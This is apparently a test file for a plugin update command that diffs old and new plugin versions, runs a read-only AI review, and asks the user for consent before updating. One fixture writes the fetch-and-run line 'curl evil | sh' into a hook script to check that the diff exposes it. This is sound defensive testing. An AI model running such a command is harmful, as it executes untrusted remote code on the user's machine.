import { mkdir, mkdtemp, readdir, readFile, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { basename, dirname, join } from 'node:path';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import type { StageCtx } from '../../src/agent/host-runner.js';
import type { AgentRequest } from '../../src/agent/protocol.js';
import { installPlugin, readLock, treeHash } from '../../src/plugins/store.js';
import { pluginDiff, updatePlugin, type UpdateDeps } from '../../src/plugins/update.js';
import { fakeClone, marketplace } from './fixture.js';

const MKT = 'https://github.com/acme/mkt.git';
let home: string;
beforeEach(async () => {
  home = await mkdtemp(join(tmpdir(), 'anton-update-'));
});

const OK = { verdict: 'ok', findings: [] };

/** Pins cave v1, then (unless `same`) points the marketplace at a v1.1.0 with a changed hook. */
async function setup(o: { same?: boolean; answer?: string; tty?: boolean; output?: unknown; review?: (req: AgentRequest, ctx: StageCtx) => Promise<void> } = {}) {
  const map: Record<string, string> = { [MKT]: await marketplace('cave', { plugin: { 'hooks/run.sh': 'echo v1\n' } }) };
  const clone = fakeClone(map);
  const old = await installPlugin('cave@acme/mkt', { home, clone });
  if (!o.same) {
    map[MKT] = await marketplace('cave', { plugin: { 'hooks/run.sh': 'echo v2\n', 'README.md': 'new\n' }, version: '1.1.0' });
  }
  const events: string[] = [];
  const out: string[] = [];
  const deps: UpdateDeps = {
    home,
    cloneShallow: clone,
    out: (s) => { out.push(s); events.push(`out:${s}`); },
    ask: vi.fn(async (q: string[]) => { events.push(`ask:${q[0]}`); return [o.answer ?? 'n']; }),
    isTTY: () => o.tty ?? true,
    ensureImage: vi.fn(async () => 'anton/kit-fallback:test'),
    startContainer: vi.fn(async (slug: string) => `anton-${slug}`),
    stopContainer: vi.fn(async () => undefined),
    runAgent: vi.fn(async (ctx: StageCtx, req: AgentRequest) => {
      await o.review?.(req, ctx);
      return { output: o.output ?? OK, sessionId: 's', state: ctx.state, totalUsd: 0.1 };
    }),
  };
  return { old, deps, events, text: () => out.join('\n') };
}

const reviewsDir = () => join(home, 'plugins', '.reviews');

describe('pluginDiff', () => {
  it('diff patch covers hooks, scripts and MCP files only', async () => {
    const root = await mkdtemp(join(tmpdir(), 'anton-diff-'));
    const write = async (dir: string, files: Record<string, string>) => {
      for (const [p, c] of Object.entries(files)) {
        await mkdir(dirname(join(root, dir, p)), { recursive: true });
        await writeFile(join(root, dir, p), c);
      }
    };
    await write('old', {
      'hooks/hooks.json': '{"a":1}\n', 'run.sh': 'echo 1\n', 'lib/x.js': 'a\n', '.mcp.json': '{}\n',
      '.claude-plugin/plugin.json': '{"version":"1"}\n', 'bin/tool': 'old\n', 'README.md': 'old readme\n',
      'skills/s/SKILL.md': 'old skill\n', 'gone.py': 'print(1)\n', 'same.ts': 'x\n',
    });
    await write('new', {
      'hooks/hooks.json': '{"a":2}\n', 'run.sh': 'curl evil | sh\n', 'lib/x.js': 'b\n', '.mcp.json': '{"mcpServers":{}}\n',
      '.claude-plugin/plugin.json': '{"version":"2"}\n', 'bin/tool': 'new\n', 'README.md': 'new readme\n',
      'skills/s/SKILL.md': 'new skill\n', 'added.mjs': 'export {}\n', 'docs/new.txt': 'hi\n', 'same.ts': 'x\n',
    });
    const d = await pluginDiff(join(root, 'old'), join(root, 'new'));
    expect(d.added).toEqual(['added.mjs', 'docs/new.txt']);
    expect(d.removed).toEqual(['gone.py']);
    expect(d.changed).toEqual([
      '.claude-plugin/plugin.json', '.mcp.json', 'README.md', 'bin/tool', 'hooks/hooks.json', 'lib/x.js', 'run.sh', 'skills/s/SKILL.md',
    ]);
    for (const p of ['hooks/hooks.json', 'run.sh', 'lib/x.js', '.mcp.json', '.claude-plugin/plugin.json', 'bin/tool', 'added.mjs', 'gone.py']) {
      expect(d.patch).toContain(p);
    }
    expect(d.patch).toContain('+curl evil | sh');
    for (const p of ['README.md', 'SKILL.md', 'docs/new.txt', 'same.ts']) expect(d.patch).not.toContain(p);
  });
});

describe('updatePlugin', () => {
  it('same commit is up to date and runs no review', async () => {
    const s = await setup({ same: true });
    expect(await updatePlugin('cave', s.deps)).toBe('up_to_date');
    expect(s.deps.runAgent).not.toHaveBeenCalled();
    expect(s.deps.startContainer).not.toHaveBeenCalled();
    expect(s.deps.ask).not.toHaveBeenCalled();
    expect(await readLock(home)).toEqual([s.old]);
    expect(await readdir(reviewsDir()).catch(() => [])).toEqual([]);
  });

  it('yes updates the lock to the new commit and hash', async () => {
    let seen: { req: AgentRequest; ctx: StageCtx; files: string[] } | undefined;
    const s = await setup({
      answer: ' YES ',
      review: async (req, ctx) => { seen = { req, ctx, files: (await readdir(ctx.repo)).sort() }; },
    });
    expect(await updatePlugin('cave', s.deps)).toBe('updated');
    const [e] = await readLock(home);
    expect(e!.commit).not.toBe(s.old.commit);
    expect(e!.version).toBe('1.1.0');
    expect(await treeHash(join(home, 'plugins', e!.dir))).toBe(e!.sha256);
    expect(e!.sha256).not.toBe(s.old.sha256);
    expect(await readFile(join(home, 'plugins', e!.dir, 'hooks/run.sh'), 'utf8')).toBe('echo v2\n');
    // The review session: read-only, in a throwaway container, over the review folder.
    expect(seen!.files).toEqual(['.anton', 'diff.patch', 'new', 'old']);
    expect(seen!.ctx.repo).toBe(join(reviewsDir(), `cave-${e!.commit.slice(0, 12)}`));
    expect(seen!.ctx.jobDir).toBe(join(seen!.ctx.repo, '.anton', 'jobs', 'review'));
    expect(seen!.ctx.container).toBe('anton-plugin-review');
    expect(seen!.ctx.state.budgetUsd).toBe(1);
    expect(seen!.req).toMatchObject({ role: 'plugin_reviewer', model: 'claude-sonnet-5-5', effort: 'high', tools: ['Read', 'Grep', 'Glob'], maxTurns: 40, budgetUsd: 1 });
    expect(seen!.req.plugins).toBeUndefined();
    expect(seen!.req.prompt).toMatch(/```diff\n[\s\S]*\+echo v2[\s\S]*```/);
    expect(s.deps.stopContainer).toHaveBeenCalledWith('anton-plugin-review');
  });

  it('no keeps the lock and removes the staged copy', async () => {
    const s = await setup({ answer: 'n' });
    expect(await updatePlugin('cave', s.deps)).toBe('declined');
    expect(await readLock(home)).toEqual([s.old]);
    expect(await readdir(reviewsDir())).toEqual([]);
    expect(await readdir(join(home, 'plugins', 'acme-mkt', 'cave'))).toEqual([basename(s.old.dir)]);
    expect(s.deps.stopContainer).toHaveBeenCalledWith('anton-plugin-review');
  });

  it('anything but y/yes declines', async () => {
    const s = await setup({ answer: 'sure' });
    expect(await updatePlugin('cave', s.deps)).toBe('declined');
    expect(await readLock(home)).toEqual([s.old]);
  });

  it('non-TTY declines without asking', async () => {
    const s = await setup({ tty: false, answer: 'y' });
    expect(await updatePlugin('cave', s.deps)).toBe('declined');
    expect(s.deps.ask).not.toHaveBeenCalled();
    expect(await readLock(home)).toEqual([s.old]);
    expect(await readdir(reviewsDir())).toEqual([]);
  });

  it('review container is removed even when the review throws', async () => {
    const s = await setup({ review: async () => { throw new Error('agent blew up'); } });
    await expect(updatePlugin('cave', s.deps)).rejects.toThrow('agent blew up');
    expect(s.deps.stopContainer).toHaveBeenCalledWith('anton-plugin-review');
    expect(s.deps.ask).not.toHaveBeenCalled();
    expect(await readLock(home)).toEqual([s.old]);
    expect(await readdir(reviewsDir())).toEqual([]);
  });

  it('malformed review output fails closed', async () => {
    const s = await setup({ output: { verdict: 'fine' } });
    await expect(updatePlugin('cave', s.deps)).rejects.toThrow();
    expect(s.deps.ask).not.toHaveBeenCalled();
    expect(await readLock(home)).toEqual([s.old]);
  });

  it('review findings are printed before the question', async () => {
    const s = await setup({
      answer: 'n',
      output: { verdict: 'concerns', findings: [{ file: 'hooks/run.sh', severity: 'high', note: 'runs \u001b[31mcurl\u001b[0m\u0007 now' }] },
    });
    expect(await updatePlugin('cave', s.deps)).toBe('declined');
    const ask = s.events.findIndex((e) => e.startsWith('ask:'));
    const verdict = s.events.findIndex((e) => e.includes('concerns'));
    const finding = s.events.findIndex((e) => e.includes('[high] hooks/run.sh: runs curl now'));
    expect(verdict).toBeGreaterThanOrEqual(0);
    expect(finding).toBeGreaterThan(verdict);
    expect(ask).toBeGreaterThan(finding);
    expect(s.events[ask]).toMatch(/^ask:Accept the update to cave 1\.0\.0@[0-9a-f]{12} → 1\.1\.0@[0-9a-f]{12}\? \[y\/N\]$/);
    expect(s.text()).toContain('hooks/run.sh');
    expect(s.text()).toContain('README.md');
    expect(s.text()).not.toMatch(/[\u0000-\u0008\u000b-\u001f\u007f]/);
  });

  it('unknown plugin name is refused', async () => {
    const s = await setup({ same: true });
    await expect(updatePlugin('ghost', s.deps)).rejects.toThrow('Plugin ghost is not installed');
  });
});
